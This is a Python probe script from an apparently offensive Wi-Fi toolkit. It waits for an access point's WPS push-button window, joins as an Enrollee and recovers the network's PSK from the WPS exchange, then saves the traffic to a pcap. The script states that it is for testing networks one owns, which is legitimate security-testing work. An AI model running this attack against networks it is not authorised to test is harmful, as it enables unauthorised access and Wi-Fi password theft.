"""WPS Push-Button (PBC) capture probe — hardware ground truth for P3.

Detection is passive (AccessPoint.wps_pbc_active, from beacons). This probe:
  1. parks on the target's channel and finds it,
  2. watches for the PBC walk window to open (you press the AP's WPS button),
  3. the instant it sees DevPwId=PBC + SelectedRegistrar, associates as an
     Enrollee and runs WpsEnrollee to pull the PSK out of M8,
  4. dumps the full RX+TX conversation to a clean pcap.

This TRANSMITS (assoc + EAPOL). Run it only against a network you own.

Usage (at your AirLink box):
    uv run python scripts/wps/pbc_probe.py            # wait for you to press WPS
    uv run python scripts/wps/pbc_probe.py --now      # attempt immediately (window already open)
    uv run python scripts/wps/pbc_probe.py --bssid AA:.. --ssid X --channel 1
"""
from __future__ import annotations

import argparse
import asyncio
import logging
import struct
import sys
import time
from pathlib import Path
from types import SimpleNamespace

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from wifit3.engine.attacks.wps.pbc import WpsPbcCapture
from wifit3.engine.attacks.wps.registrar import PinResult
from wifit3.engine.pcap import _strip_fcs
from wifit3.wlan.manager import WlanDeviceManager


def step(label):
    print(f"\n--- {label} ---")


def ok(msg):
    print(f"[PASS] {msg}")


def info(msg):
    print(f"  {msg}")


def fail(msg):
    print(f"[FAIL] {msg}")
    sys.exit(1)


def write_pcap(path: Path, frames: list) -> int:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("wb") as f:
        f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 105))
        for ts, frame in frames:
            frame = _strip_fcs(frame)
            sec = int(ts)
            usec = int((ts - sec) * 1_000_000)
            f.write(struct.pack("<IIII", sec, usec, len(frame), len(frame)))
            f.write(frame)
    return len(frames)


def load_default_target() -> dict:
    path = Path(__file__).parent.parent.parent / "data_dumps" / "wps_pin.txt"
    out: dict = {}
    if path.exists():
        for line in path.read_text().splitlines():
            if ":" in line:
                k, _, v = line.partition(":")
                out[k.strip().lower()] = v.strip()
    return out


async def discover_iface(debug):
    mgr = WlanDeviceManager()
    ifaces = await mgr.refresh()
    if not ifaces:
        fail("No supported wifit3 card found.")
    iface = ifaces[0]
    info(f"Using {iface.name}: {iface.description}")
    if not await iface.connect(progress_cb=lambda p, m: None):
        fail("Driver connect() failed — replug and retry.")
    return mgr, iface


async def main_async(args) -> int:
    d = load_default_target()
    bssid = (args.bssid or d.get("bssid", "")).lower()
    ssid = args.ssid if args.ssid is not None else d.get("ssid", "")
    channel = args.channel or int(d.get("channel", "1"))
    if not bssid:
        fail("No target BSSID (give --bssid or populate data_dumps/wps_pin.txt).")

    mgr, iface = await discover_iface(args.debug)
    capture: list = []
    iface.register_rx_callback(lambda fr, rssi, ts: capture.append((ts, bytes(fr))))
    try:
        step(f"Park on channel {channel}, find {bssid}")
        if not await iface.set_channel(channel):
            fail(f"set_channel({channel}) failed.")
        deadline = time.time() + args.scan_secs
        target = None
        while time.time() < deadline and target is None:
            target = iface.access_points.get(bssid)
            await asyncio.sleep(0.3)
        if target:
            info(f"Found {target.bssid} ssid={target.ssid!r} wps={target.wps} "
                 f"pbc_active={target.wps_pbc_active}")
        else:
            info("[warn] AP not seen in scan; proceeding with the named BSSID.")
            target = SimpleNamespace(bssid=bssid, ssid=ssid, channel=channel,
                                     wps_pbc_active=False)

        if not args.now:
            step("Waiting for the PBC walk window")
            info(f"Press the WPS button on the AP now (watching up to {args.wait:.0f}s)…")
            end = time.time() + args.wait
            while time.time() < end:
                cur = iface.access_points.get(bssid)
                if cur and cur.wps_pbc_active:
                    target = cur
                    ok("PBC window OPEN — DevPwId=PBC + SelectedRegistrar seen")
                    break
                await asyncio.sleep(0.4)
            else:
                info("No PBC window detected in time. (Re-run with --now to "
                     "attempt regardless, or press the button sooner.)")
                write_pcap(Path(args.out), capture)
                return 1

        step("Associate as Enrollee + run WSC (M1..M8)")
        cap = WpsPbcCapture(iface, target, log=lambda m: print(f"    {m}"),
                            tx_observer=lambda fr: capture.append((time.time(), bytes(fr))))
        outcome = await cap.capture()

        step("Results")
        if outcome.result is PinResult.SUCCESS:
            ok(f"WPS-PBC SUCCESS — SSID={outcome.ssid!r}  PSK: {outcome.psk}")
        else:
            info(f"{outcome.result.value}: {outcome.detail}. See pcap.")
        n = write_pcap(Path(args.out), capture)
        ok(f"Captured {n} frames → {args.out}")
        return 0
    finally:
        step("Release device")
        await mgr.close_all()
        info("Closed.")


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("--bssid", help="target BSSID (default: data_dumps/wps_pin.txt)")
    p.add_argument("--ssid", help="target SSID (default: from wps_pin.txt)")
    p.add_argument("--channel", type=int, help="target channel (default: from wps_pin.txt)")
    p.add_argument("--now", action="store_true",
                   help="attempt immediately without waiting for the PBC window")
    p.add_argument("--wait", type=float, default=60.0, help="seconds to wait for the window")
    p.add_argument("--scan-secs", type=float, default=6.0)
    p.add_argument("--out", default="wifit3-wps-pbc.pcap", help="pcap output path")
    p.add_argument("--debug", action="store_true")
    args = p.parse_args()

    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8")
        except Exception:
            pass
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
    )
    try:
        return asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\nInterrupted.")
        return 130


if __name__ == "__main__":
    sys.exit(main())
